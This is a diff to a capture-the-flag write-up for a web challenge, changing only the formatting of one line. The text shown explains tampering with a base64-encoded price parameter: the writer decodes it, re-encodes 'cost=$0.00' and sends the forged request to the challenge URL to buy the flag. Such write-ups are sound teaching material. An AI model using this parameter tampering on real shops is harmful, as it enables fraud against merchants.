@@ -10,7 +10,7 @@ with the page saying "ERROR: Insufficient funds"
 
 
 The URL has a base64 encoded value for the price query string key.
-Decoding it, we get: cost=$1337.00
+Decoding it, we get: `cost=$1337.00`
 
 So we encode the text `cost=$0.00` in B64 => Y29zdD0kMC4wMA==
 We send a GET request to https://cte.bitskrieg.org/web_chall4/buy?name=flag&price=Y29zdD0kMC4wMA==
